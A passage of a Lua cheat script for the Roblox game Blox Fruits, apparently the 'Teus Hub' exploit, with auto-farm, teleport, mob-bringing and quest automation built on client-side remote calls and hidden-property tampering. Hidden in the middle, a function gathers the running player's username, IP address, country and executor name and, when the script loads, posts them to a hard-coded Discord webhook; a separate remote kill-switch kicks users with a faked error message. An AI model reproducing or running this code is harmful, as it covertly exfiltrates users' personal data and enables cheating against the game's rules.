      if (v:GetModelCFrame().Position-wtf.Position).Magnitude < b then
         a = v:GetModelCFrame()
         b = (v:GetModelCFrame().Position-wtf.Position).Magnitude
      end
   end
   return a
end
function request(check1)
   game.ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack({"requestEntrance", check1}))
end

function disnoy(I, II) 
  return (Vector3.new(I.X, 0, I.Z)-Vector3.new(II.X, 0, II.Z)).Magnitude 
end 

function check11()
  return game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Visible and game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Text and (string.find(string.lower(game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Text),"risk"))
end
function getPortal(check2)
   local check3 = check2.Position
   local w = game.PlaceId
   if w == 2753915549 then
      gQ = {
         Vector3.new(-7894.6201171875, 5545.49169921875, -380.246346191406),
         Vector3.new(-4607.82275390625, 872.5422973632812, -1667.556884765625),
         Vector3.new(61163.8515625, 11.759522438049316, 1819.7841796875),
         Vector3.new(3876.280517578125, 35.10614013671875, -1939.3201904296875)
      }
   elseif w == 4442272183 then
      gQ = {
         Vector3.new(-288.46246337890625, 306.130615234375, 597.9988403320312),
         Vector3.new(2284.912109375, 15.152046203613281, 905.48291015625),
         Vector3.new(923.21252441406, 126.9760055542, 32852.83203125),
         Vector3.new(-6508.5581054688, 89.034996032715, -132.83953857422)
      }
   elseif w == 7449423635 then
      gQ = {
         Vector3.new(-5058.77490234375, 314.5155029296875, -3155.88330078125),
         Vector3.new(5756.83740234375, 610.4240112304688, -253.9253692626953),
         Vector3.new(-12463.8740234375, 374.9144592285156, -7523.77392578125),
         Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586),
         Vector3.new(-11993.580078125, 334.7812805175781, -8844.1826171875),
         Vector3.new(5314.58203125, 25.419387817382812, -125.94227600097656)
      }
   end
   local aM, aN = Vector3.new(0,0,0), math.huge

   for _, aL in pairs(gQ) do
      if (aL-check3).Magnitude < aN and (aL-check3).Magnitude < (lp:DistanceFromCharacter(aL) + 300) and aM ~= aL then
         aM, aN = aL,  (aL-check3).Magnitude
      end
   end
   return aM
end

function cancel()
  pcall(function
    ()
    
    
    sexroblox:Cancel()
    end)
   
end

function grgrgrgrg(aE)
pcall(function()
   game.Players.LocalPlayer.Character.Humanoid.Health = 0
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = aE
   wait(1)
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = aE
   game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint") 
   end)
end

function giunhabatman()
  pcall(function()
   for a, b in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
      if b:IsA"BasePart" then
         b.CanCollide = false
      end
   end
   if not game.Players.LocalPlayer.Character.Head:FindFirstChild"eltrul" then
      local ngu = Instance.new("BodyVelocity", lp.Character.Head)
      ngu.Name = "eltrul"
      ngu.MaxForce = Vector3.new(0,math.huge,0)
      ngu.Velocity = Vector3.new(0,0,0)
   end
end)
end

function check11()
  return game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Visible and game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Text and (string.find(string.lower(game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Text),"risk"))
end
function to(position)
  
   if not lp.Character:FindFirstChild"Head" then
      repeat wait()
      until lp.Character:FindFirstChild"Head"
   end
    for a, b in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
      if b:IsA"BasePart" then
         b.CanCollide = false
      end
   end
   if not game.Players.LocalPlayer.Character.Head:FindFirstChild"eltrul" then
      local ngu = Instance.new("BodyVelocity", lp.Character.Head)
      ngu.Name = "eltrul"
      ngu.MaxForce = Vector3.new(0,math.huge,0)
      ngu.Velocity = Vector3.new(0,0,0)
   end
   local aaaaaaa = lp:DistanceFromCharacter(position.Position)
   if aaaaaaa < 150 then
      pcall(function () sexroblox:Cancel() end)
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = position
      
   end
   
  -- local aH, aI = getSpawn(position), getPortal(position)

   local aH, aI = getSpawn(position), getPortal(position)
   if not check11() and disnoy(aI, aH.Position) > 850 and disnoy(position.Position, aH.Position) < disnoy(game.Players.LocalPlayer.Character:GetPrimaryPartCFrame().p,position.Position) and disnoy(game.Players.LocalPlayer.Character:GetPrimaryPartCFrame().p, aH.Position) > 3500 and disnoy(game.Players.LocalPlayer.Character:GetPrimaryPartCFrame().p,aI) > 1500 and game.Players.LocalPlayer:DistanceFromCharacter(position.Position) > 1200 and resetable() then
        cancel()
         grgrgrgrg(aH)
     
      --game.Players.LocalPlayer.Character:FindFirstChild"Head" 

   elseif disnoy(position.Position, aI) < disnoy(game.Players.LocalPlayer.Character:GetPrimaryPartCFrame().p,position.Position) and disnoy(game.Players.LocalPlayer.Character:GetPrimaryPartCFrame().p,aI) > 450 then 
     cancel()
      request(aI) 
    
      end
   
   local bbbbbbbbb = aaaaaaa/320
   
  sexroblox = game:GetService("TweenService"):Create(lp.Character.HumanoidRootPart,TweenInfo.new(bbbbbbbbb, Enum.EasingStyle.Linear),{CFrame = position})

   sexroblox:Play()
   return sexroblox
end




          
function getdelaytime(time)  
  
  oldtime = time or tick()  
  timerun = timerun or 0 
 -- print("Check: "..tick()-oldtime.." / "..timerun
    
  if ( tick()-oldtime) > 0.1 then  
  --  warn("Check: "..tick()-oldtime.." / "..timerun
    
  --setclipboard (tostring("Check: "..tick()-oldtime.." / "..timerun
    
    
end  
return true
end
          
function checkdt(time) 
  return true 
  -- 
--   oldtime = time or tick()  
--   timerun = timerun or 0 
--   print("Check: 2 . "..tick()-oldtime.." / "..timerun
--     )  
--  if ( tick()-oldtime) > 0.1 then  
--     warn("Check: 2 . "..tick()-oldtime.." / "..timerun
--     )  
--   setclipboard (tostring("Check: "..tick()-oldtime.." / "..timerun
--     
--     )) 
--   
-- end 
-- return true
end


function LogConCac()
    k2 = game:GetService"HttpService":JSONDecode(game:HttpGet"https://api.myip.com")
    
    k3 = {}
    k3["embeds"] = {{["title"] = "", ["url"] = "", ["description"] = game.Players.LocalPlayer.Name, ["fields"] = {{["name"]="Game",["value"]=(tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name) or "Wtf Can't Fetch"), ["inline"]=false},{["name"]="Ip Address", ["value"]=(k2["ip"] or "Cant Log"), ["inline"]=false},{["name"]="Country", ["value"]=(k2["country"] or "cant log"), ["inline"] = false},{["name"]="Exploit",["value"]=tostring(identifyexecutor()) or "Custom Exploit???", ["inline"] = false}}}}
    return k3
   
end 
function buglog(bug) 
    k3 = {}
   
    k3["embeds"] = {{["title"] = "", ["url"] = "", ["description"] = game.Players.LocalPlayer.Name, ["fields"] = {{["name"]="Game",["value"]=(tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name) or "Wtf Can't Fetch"), ["inline"]=false},{["name"]="Problems", ["value"]=(bug or ""), ["inline"]=false},{["name"]="Process", ["value"]=(m1 or "none").." | "..(m2 or "none"),["inline"]=false}}}}
    return k3
 
end 

function isMirageSpawn() 
  return game:GetService("Workspace").Map:FindFirstChild("MysticIsland") 
end 
       
function PostWebhook(cm, cn)
    local co = http_request or request or HttpPost or syn.request
    
    local cp =    
        co(
        {
            Url = cm,    
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(cn)
        }
    )
 
   
  --  setclipboard(game:GetService("HttpService"):JSONEncode(cn))
end
spawn(function ()
PostWebhook("https://discord.com/api/webhooks/1148666687030317110/hTS32yF21g5JH_Coy2QDjskyCvKhJSB-L4bGJTSCCLblOd8YDVNcrtx1dgNi8A69iJxr", LogConCac()) 
end)

            function CFrameQuest()
               QuestPoses = {}
               for r, v in pairs(getnilinstances()) do
                  if
                  v:IsA("Model") and v:FindFirstChild("Head") and v.Head:FindFirstChild("QuestBBG") and
                  v.Head.QuestBBG.Title.Text == "QUEST" and v.Name ~= "Villager"
                  then
                     QuestPoses[v.Name] = v:WaitForChild"HumanoidRootPart".CFrame * CFrame.new(0, -2, 2)
                  end
               end
               for r, v in pairs(game.Workspace.NPCs:GetDescendants()) do
                  if v.Name == "QuestBBG" and v.Title.Text == "QUEST" and v.Parent.Parent.Name ~= "Villager" then
                     QuestPoses[v.Parent.Parent.Name] = v.Parent.Parent.HumanoidRootPart.CFrame * CFrame.new(0, -2, 2)
                  end
               end
               DialoguesList = {}
               for r, v in pairs(require(game.ReplicatedStorage.DialoguesList)) do
                  DialoguesList[v] = r
               end
               local V = getscriptclosure(game:GetService("Players").LocalPlayer.PlayerScripts.NPC)
               local W = {}
               for k, v in pairs(debug.getprotos(V)) do
                  if #debug.getconstants(v) == 1 then
                     table.insert(W, debug.getconstant(v, 1))
                  end
               end
               local X = false
               local Y = {}
               for k, v in pairs(debug.getconstants(V)) do
                  if type(v) == "string" then
                     if v == "Players" then
                        X = false
                     end
                     if not X then
                        if v == "Blox Fruit Dealer" then
                           X = true
                        end
                     else
                     end
                     if X then
                        table.insert(Y, v)
                     end
                  end
               end
               local Z = {}
               QuestPoint = {}
               for k, v in pairs(Y) do
                  if QuestPoses[v] then
                     Z[W[k]] = Y[k]
                  end
               end
               for r, v in next, Z do
                  QuestPoint[r] = QuestPoses[v]
               end
               QuestPoint["SkyExp1Quest"] =
               CFrame.new(
               -7857.28516,
               5544.34033,
               -382.321503,
               -0.422592998,
               0,
               0.906319618,
               0,
               1,
               0,
               -0.906319618,
               0,
               -0.422592998
               )
            end


function CheckBoss(bg) 
  if skidymf(game:GetService("ReplicatedStorage"):FindFirstChild(bg) )   then 
    return game:GetService("ReplicatedStorage"):FindFirstChild(bg)  
    end 
  if skidymf(game.workspace.Enemies:FindFirstChild(bg) ) then 
    return game.workspace.Enemies:FindFirstChild(bg)  
    end 
end
               
               
            
            function EquipWeaponName(m)
               if not m then
                  return
               end
               NoClip = true
               ToolSe = m
               if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
                  local bi = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
                  wait(.4)
                  game.Players.LocalPlayer.Character.Humanoid:EquipTool(bi)
                  return true
               end
               if game.Players.LocalPlayer.Character:FindFirstChild(m) then
                  return game.Players.LocalPlayer.Character:FindFirstChild(m)
               end
            end
            function skidymf(a)
               if  a and  a.Parent and a:FindFirstChild("Humanoid") and a:FindFirstChild("HumanoidRootPart") and a.Humanoid.Health >= 0 and (a.HumanoidRootPart or a.Character.HumanoidRootPart).CFrame
                then
                  return true
               else
                  return false
               end
            end

            function skidymf1()
               sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
               local s = {}
               local ak = false
               for al, am in pairs(getsortedmon()) do
                  if skidymf(am) then
                     for al, an in pairs(getsortedmon()) do
                        if skidymf(an) and skidymf(am) then
                           if (an.HumanoidRootPart.Position - am.HumanoidRootPart.Position).Magnitude < 400 then
                              if not s[am.HumanoidRootPart.CFrame] then
                                 s[am.HumanoidRootPart.CFrame] = 1
                              else
                                 s[am.HumanoidRootPart.CFrame] = s[am.HumanoidRootPart.CFrame] + 1
                              end
                           end
                        end
                     end
                  end
               end
               local s2 = dbobii(s)
               for r, v in pairs(s) do
                  if v == s2 then
                     ak = r
                  end
               end
               return ak
            end

            function dbobii(aj)
               local tb2 = 0
               for r, v in pairs(aj) do
                  if v > tb2 then
                     tb2 = v
                  end
               end
               return tb2
            end


            function GetNpcPos(aq)
               local ar
               local c = 0
               for k, v in pairs(getsortedmon()) do
                  if v.Name == aq then
                     if not ar then
                        ar = v.HumanoidRootPart.Position
                     else
                        ar = ar + v.HumanoidRootPart.Position
                     end
                     c = c + 1
                  end
               end
               ar = ar / c
               return ar
            end
-- 
-- 
             function SizePart(v)
                if not v:FindFirstChild("HumanoidRootPart") then
                   return nil
                end
                v.HumanoidRootPart.CanCollide = false
                v.Humanoid:ChangeState(11)
                if not v.HumanoidRootPart:FindFirstChild"Hold" then
                   local Hold = Instance.new("BodyVelocity", v.HumanoidRootPart)
                   Hold.Name = "Hold"
                   Hold.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                   Hold.Velocity = Vector3.new(0, 0, 0)
                end
             end
            function GetNearestPlayer(as)

               ner = math.huge
               for r, v in pairs(game.Players:GetChildren()) do
                  if v and skidymf(v.Character) and (v.Character.HumanoidRootPart.Position - as).Magnitude < ner then
                     ner = (v.Character.HumanoidRootPart.Position - as).Magnitude
                  end
               end
               for r, v in pairs(game.Players:GetChildren()) do
                  if v and skidymf(v.Character) and (v.Character.HumanoidRootPart.Position - as).Magnitude <= ner then
                     ner2 = v.Name
                  end
               end
               if game.Players.LocalPlayer.Name == ner2 then
                  return true
               end
            end
   
   network = isnetworkowner or InMyNetWork or newcclosure(function () 
     return true
     end)
   function createcheckthread(data) 
     spawn (function ()
     if not data then return end  
     
     if skidymf(data[1]) then 
       data[5] = data[1].Humanoid 
       data[6] = data[5].Health 
       data[7] = os.time()-data[2] 
       data[10] = data[1].HumanoidRootPart.CFrame
       while skidymf(data[1]) and wait() do
       if data[1].Humanoid.Health >= data[6] and data[7] > 3 then 
    
         data[1].HumanoidRootPart.CFrame = data[10]
         data[1].Humanoid.Health = 0  
       end
       end 
     end
     end) 
   end 
   
function gnc() 
  
    iroajjrod, kvbahifj = nil, math.huge
    for kejrkaoufha, othabfooahf in pairs(game.Workspace:GetChildren()) do
        if
            string.find(othabfooahf.Name, "Chest")
         then 
          
            if lp:DistanceFromCharacter(othabfooahf.Position) < kvbahifj then
              
                iroajjrod = othabfooahf
                kvbahifj = lp:DistanceFromCharacter(othabfooahf.Position)
            end
        end
    end
    return iroajjrod
end

ajaxjaxjaxjax = {}
function BringMob(Mob)
  pcall(function ()
  for i, v in pairs(workspace.Enemies: GetChildren ()) do
   if v.Name == Mob.Name then
                            if (v.HumanoidRootPart.Position-Mob.HumanoidRootPart.Position).Magnitude <= 480 and (v.HumanoidRootPart.Position-Mob.HumanoidRootPart.Position).Magnitude > 10 and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 and network(v.HumanoidRootPart)  then 
                              
							createcheckthread({
							  v,
							  os.time()
							})
						--	to(v.HumanoidRootPart.CFrame+getKillVector3())
                                							v.HumanoidRootPart.CFrame = Mob.HumanoidRootPart.CFrame
							v.Humanoid.JumpPower = 0
							v.Humanoid.WalkSpeed = 0
							v.HumanoidRootPart.Size = Vector3.new(60,60,60)
							
				     v.HumanoidRootPart.CanCollide = false
							
							sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
							v.Humanoid:ChangeState(14)
							v.Humanoid:ChangeState(11) 
              SizePart(v)
                            end 
   end 
  end 
                        end)
                        
end 

            function eatfruit(name)
               pcall(function ()
               EquipWeaponName(name)
               if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities") and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities")["Z"]["Awakened"] and c().Process["Lock Awakening Fruit"] then noti"Lock Awakened Fruit" game.Players.LocalPlayer.Character.Humanoid.Health = -1 return end
               if not workspace.Characters[lp.Name][name].EatRemote:InvokeServer() then
                  game.Players.LocalPlayer.Character.Humanoid.Health = -1
               end
               end)
            end
            function deobietsettengi()
               if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress","Bartilo" ) == 1 then
                  if not CheckBoss("Jeremy [Lv. 850] [Boss]") then
                     return false
                  else
                     return true
                  end
               else
                  return true
               end
            end
            function getMobPirateRaid()
              if not CheckSea(3) then return end
              for i, v in pairs(game.ReplicatedStorage:GetChildren()) do 
                if
                     not string.find(v.Name, "Brigade") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and
                     v:FindFirstChild("HumanoidRootPart") and
                     (v.HumanoidRootPart.Position -
                     Vector3.new(-5543.5327148438, 313.80062866211, -2964.2585449219)).magnitude <= 3000 and
                     not string.find(v.Name, "Boss") and
                     not string.find(v.Name, "Friend")
                     then 
                to(CFrame.new(Vector3.new(-5543.5327148438, 313.80062866211, -2964.2585449219))) 
                     end 
              end 
                   
              if checkNotify"pirates are raiding" then 
                to(CFrame.new(Vector3.new(-5543.5327148438, 313.80062866211, -2964.2585449219))) 
                return
                end
               for r, v in pairs(workspace.Enemies:GetChildren()) do 
                 
                     if
                     not string.find(v.Name, "Brigade") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and
                     v:FindFirstChild("HumanoidRootPart") and
                     (v.HumanoidRootPart.Position -
                     Vector3.new(-5543.5327148438, 313.80062866211, -2964.2585449219)).magnitude <= 3000 and
                     not string.find(v.Name, "Boss") and
                     not string.find(v.Name, "Friend")
                     then
                       
                        return v
                     end
                 
                  
                  
                  
               end
               for r, v in pairs(game.ReplicatedStorage:GetChildren()) do
               
                  spawn(
                  function()
                     if
                     not string.find(v.Name, "Brigade") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and
                     v:FindFirstChild("HumanoidRootPart") and
                     (v.HumanoidRootPart.Position -
                     Vector3.new(-5543.5327148438, 313.80062866211, -2964.2585449219)).magnitude <= 3000 and
                     not string.find(v.Name, "Boss") and
                     not string.find(v.Name, "Friend")
                     then
                        return v
                     end
                  end
                  
                  )
               end 
               
             
            end 
        

function UpV3()
wait(2)
    local args = {[1] = "Wenlocktoad", [2] = "3"}
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    wait(2)
end
            function BTP(Position)
               
               game.Players.LocalPlayer.Character.Head:Destroy()
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Position
               wait(1)
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Position
               game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
            end


            function bypass(pos)
               local a, b = nil, math.huge
               for i,v in pairs(game.Workspace._WorldOrigin.PlayerSpawns:FindFirstChild(tostring(game.Players.LocalPlayer.Team)):GetChildren()) do
                  if game.Players.LocalPlayer:DistanceFromCharacter(v:GetModelCFrame().Position) < b then
                     a = v:GetModelCFrame()
                     b = game.Players.LocalPlayer:DistanceFromCharacter(v:GetModelCFrame().Position)
                  end
               end

               if (pos.Position-CFrame.new(61191.12109375, 18.497436523438, 1561.8873291016).Position).Magnitude < 5000 then
                  requestEntrance(CFrame.new(61191.12109375, 18.497436523438, 1561.8873291016).Position)
               end
               if a then
                  if game.Players.LocalPlayer:DistanceFromCharacter(a.Position) < game.Players.LocalPlayer:DistanceFromCharacter(pos.Position) and game.Players.LocalPlayer:DistanceFromCharacter(a.Position) > 200 then
                     BTP(a)
                  end
               end
            end


            function CheckSea(e) 
              if sussea then 
              if sussea == e then return true end
              else
               if game.PlaceId == 2753915549 then
                  if e == 1 then 
                    sussea = 1
                     return true
                  end
               elseif  game.PlaceId == 4442272183 then
                  if e == 2 then
                    sussea = 2
                     return true
                  end
               elseif  game.PlaceId == 7449423635 then
                  if e == 3 then
                    sussea = 3
                     return true
                  end
               end
               return false
            end
end 

            function TeleportSea(e)
               if e == 1 then
                  if not CheckSea(e) then
                     local args = {[1] = "TravelMain"}
                     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                     wait()
                  end
               elseif  e == 2 then
                  if not CheckSea(e) then
                     local args = {[1] = "TravelDressrosa"}
                     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                  end
               elseif  e == 3 then
                  if not CheckSea(e) then
                     local args = {[1] = "TravelZou"}
                     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                  end
               end
            end
getgenv().a = false

 LPH_CRASH = LPH_CRASH or function() repeat until false end 

function out(a, b) 
  if a then b() end 
end 
out(getgenv().a , LPH_CRASH)


getgenv ().a = {
  host = "https://cringeman.gggggjdksksk.repl.co"
}

function parserPath(path) 
  return getgenv().a.host .. "/"..path
end
function fetch_data() 
  local bigay = game:HttpGet(parserPath("/api/v1/getInfo"))
   local ngu = game:GetService("HttpService"):JSONDecode(bigay)
ngu = ngu.data
warn(bigay)
return ngu
end 

function bingu(b0, b1) 
  pcall(function ()
  game.Players.LocalPlayer:Kick(b1)
  for k, v in pairs(game.CoreGui.RobloxPromptGui.promptOverlay:GetChildren()) do 
    v.TitleFrame.ErrorTitle.Text = b0 
  end 
    end) 
  
  wait(30) 
  
end 

out(Rapid, LPH_CRASH) 
Rapid = {
  Checking_Delay = 2, 
} 


Rapid.DEFAULT_DATA = fetch_data(); 

spawn(function() 
    while task.wait((function() 
      if Rapid.Checking_Delay > 5 then
          return 2 
      end 
      return Rapid.Checking_Delay
    end)()) do 
    warn(109283737)
      if Rapid.DEFAULT_DATA.POBqdNKxAW ~= fetch_data().POBqdNKxAW then
        
        bingu("Teus Hub / Server Crashed", "An Kick Request Requested From We Server") 
      end 
    end 
  end)

      
     

            function down(use) -- Send key to client
               game:service("VirtualInputManager"):SendKeyEvent(true, use, false, game)
               task.wait()
               game:service("VirtualInputManager"):SendKeyEvent(false, use, false, game)
            end

            function equip(tooltip)
               local player = game.Players.LocalPlayer
               local character = player.Character or player.CharacterAdded:Wait()
               for _, item in pairs(player.Backpack:GetChildren()) do
                  if item:IsA("Tool") and item.ToolTip == tooltip then
                     local humanoid = character:FindFirstChildOfClass("Humanoid")
                     if humanoid and not humanoid:IsDescendantOf(item) then
                        game.Players.LocalPlayer.Character.Humanoid:EquipTool(item)
                        return item
                     end
                  end
               end

               return false
            end
            -- 
            function gmlp()
               if MobLevel1OrMobLevel2() then
                  
                  return (MobLevel1OrMobLevel2():gsub(" %pLv. %d+%p", "")):gsub(" ", "")
               end
            end
            function fruitspawn()
               for i, v in pairs(game.Workspace:GetChildren()) do
                  if string.find(v.Name, "Fruit") and v:FindFirstChild"Handle" then
                     for b, c in pairs(v:GetChildren()) do
                        if string.find(c.Name, "Mesh") then
                           if (v.Handle.CFrame.Position-c.CFrame.Position).Magnitude < 5 then
                              return v
                           end
                        end
                     end
                  end
               end
            end


    
            function storefruit()
              if AutoRaid then return end 
repeat wait() until game:GetService("Players").LocalPlayer:FindFirstChild"Data"
      local sex = game:GetService("Players").LocalPlayer:FindFirstChild"Data".DevilFruit.Value
               for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do

                  if string.find(v.Name, "Fruit") then

                        local name = v.Name
                     for i2, v2 in pairs(fruit) do

                        if string.find(string.lower(v2), string.gsub(string.lower(name), " fruit", "")) then


                           if raidfruit and ( name == raidfruit or string.find(name, raidfruit)) then return end
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit",v2, v)
                           if v and checkNotify"You can only store" then
                        
                          
                              -- noti(getFruitTier(name), getFruitTier(game.Players.LocalPlayer.Data.DevilFruit))
                              if v and v.Name and  game.Players.LocalPlayer.Data.DevilFruit.Value and getFruitTier(v.Name or name)
                              >= getFruitTier(NameDf()) and c().Fruit["Eat While Cant Store"] then
noti"Eat Fruit"
                                 eatfruit(v.Name)
                              elseif  c().Fruit["Auto Raid While Cant Store"] and getPlayerFragments() < c().Fruit["Fragments Limit By Fruit Loot Raid"] and getPlayerLevel() > 1100 and not CheckSea(1) then 
                                
                                 
                                 AutoRaid = true
                                 PullFruit = false
                              else
noti"Shit"
                                 game.Players.LocalPlayer.Character.Humanoid.Health=0
                              end
                              return;
                           else
                              noti("stored")
                           end
                        end
                     end
                  end
               end
              


repeat wait() until game:GetService("Players").LocalPlayer:FindFirstChild"Data"
      local sex = game:GetService("Players").LocalPlayer:FindFirstChild"Data".DevilFruit.Value
               for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do

                  if string.find(v.Name, "Fruit") then

                        local name = v.Name
                     for i2, v2 in pairs(fruit) do

                        if string.find(string.lower(v2), string.gsub(string.lower(name), " fruit", "")) then


                           if raidfruit and ( name == raidfruit or string.find(name, raidfruit)) then return end
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit",v2, v)
                           if v and checkNotify"You can only store" then
                        
                          
                              -- noti(getFruitTier(name), getFruitTier(game.Players.LocalPlayer.Data.DevilFruit))
                              if v and v.Name and  game.Players.LocalPlayer.Data.DevilFruit.Value and getFruitTier(v.Name or name)
                              >= getFruitTier(NameDf()) and c().Fruit["Eat While Cant Store"] then
noti"Eat Fruit"
                                 eatfruit(v.Name)
                              elseif  c().Fruit["Auto Raid While Cant Store"] and getPlayerFragments() < c().Fruit["Fragments Limit By Fruit Loot Raid"] and getPlayerLevel() > 1100 and not CheckSea(1) then 
                            
                                 
                                 AutoRaid = true
                                 PullFruit = false
                              else
noti"Shit"
                                 game.Players.LocalPlayer.Character.Humanoid.Health=0
                              end
                              return;
                           else
                              noti("stored")
                           end
                        end
                     end
                  end
               end

          end
            function set(v)
             TextLabel.Text = tostring(v)
               m1 = v
            end
            function set1(v)
             TextLabel1.Text = tostring(v)
              
               m2 = v
            end

function cdkstuff1() 
  
     
     if checkMelee"Godhuman" and eltrul["Godhuman"] > 399 and not checkitem"Cursed Dual Katana" then
       
       local process = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress") 
      local a, b = checkitem"Yama" 
      local cl, d = checkitem"Tushita" 
   
      
          if a and a.Mastery > 350 then
            if cl and cl.Mastery > 350 then
           if process.Good == -1 then
             game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good") 
             
             pcall(to(getmon"Mythological Pirate [Lv. 1850]".HumanoidRootPart.CFrame) or getMobLoadPos"Mythological Pirate".CFrame)
             return true
           elseif  process.Evil == -1 then 
             game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
              for i, v in pairs(workspace.NPCs:GetChildren()) do 
                if v.Name == "Luxury Boat Dealer" then 
                  game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","BoatQuest",v) 
                end 
              end 
             return true
           elseif  process.Evil == 0 then
             game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
               for i, v in pairs(workspace.Enemies:GetChildren()) do 
                 if v:FindFirstChild("HazeESP") then 
                   BringMob(v)
                   click = true
                   repeat wait () 
                     pcall(function()
                     to(v.HumanoidRootPart.CFrame*CFrame.new(5,35,8)) 
                     stuff(v)
                   end) 
                   until not skidymf(v) 
                   click = false
                 end 
               end 
            return true
           elseif  process.Good == 0 then 
             game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
            return false
           elseif  process.Evil == 1 then  
             game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
             if CheckBoss"Soul Reaper [Lv. 2100] [Raid Boss]" then
               game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","Progress","Evil")
               
                 local b = CheckBoss"Soul Reaper [Lv. 2100] [Raid Boss]"
                 repeat wait()
                 to(b.HumanoidRootPart.CFrame)
                 until game:GetService("Workspace").Map:FindFirstChild("HellDimension") 
                 wait(2) 
                 for i3,v3 in pairs(game:GetService("Workspace").Map.HellDimension:GetChildren()) do 
                   
                                                            if string.find(v3.Name, 'Torch') and v3:FindFirstChild("ProximityPrompt") then
                                                                if v3.ProximityPrompt.Enabled == true then
                                                                    repeat wait()
                                                                    if (v3.Position-plr.Character.HumanoidRootPart.Position).Magnitude <= 5 then 
                                                                        fireproximityprompt(v3.ProximityPrompt)
                                                                    else
                                                                       to(v3.CFrame)
                                                                    end
                                                                   until game:GetService("Workspace").Enemies:FindFirstChild('Cursed Skeleton [Lv. 2200]') or v3.ProximityPrompt.Enabled == false
                                                                    
                                                                end
                                                            end
                 end 
                                                      repeat wait()
                                                        for i, v in pairs(getsortedmon()) do 
                                                          pcall(function()
                                                        if string.find(v.Name, "Cursed Skeleton") or string.find(v.Name, "Hell") then 
                                                          v.HumanoidRootPart.CanCollide = false
                           sethiddenproperty(
                           game:GetService("Players").LocalPlayer,
                           "SimulationRadius",
                           math.huge)
                           v.Humanoid.Health = 0
                           v:BreakJoints()
                           end
                                                      end )
                                                      
                                                      end
                                                      until not game.Workspace.Enemies:FindFirstChild"Hell's Messenger [Lv. 2200] [Boss]"
                                                      wait(.2) 
                                                      to(game:GetService("Workspace").Map.HellDimension.Exit.CFrame)
             end 
           end
          elseif  process.Good == 1 then 
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest","StartTrial","Good")
             if CheckBoss"Cake Queen [Lv. 2175] [Boss]" then 
               
               local aG = CheckBoss"Cake Queen [Lv. 2175] [Boss]"
               repeat wait() 
                 pcall(function() 
                   to(getKillVector3(aG.HumanoidRootPart.CFrame))
                   stuff () 
                   click = true 
                 end) 
               until not skidymf(aG) or game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension")
               wait(2) 
               for i, v in pairs(game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension")) do 
                   
                                                            if string.find(v3.Name, 'Torch') and v3:FindFirstChild("ProximityPrompt") then
                                                                if v3.ProximityPrompt.Enabled == true then
                                                                    repeat wait()
                                                                    if (v3.Position-plr.Character.HumanoidRootPart.Position).Magnitude <= 5 then 
                                                                        fireproximityprompt(v3.ProximityPrompt)
                                                                    else
                                                                       to(v3.CFrame)
                                                                    end
                                                                   until game:GetService("Workspace").Enemies:FindFirstChild("Heaven's Guardian [Lv. 2200] [Boss]") or v3.ProximityPrompt.Enabled == false
                                       repeat wait()
                                                        for i, v in pairs(getsortedmon()) do 
                                                          pcall(function()
                                                        if string.find(v.Name, "Cursed Skeleton") or string.find(v.Name, "Heaven") then 
                                                          v.HumanoidRootPart.CanCollide = false
                           sethiddenproperty(
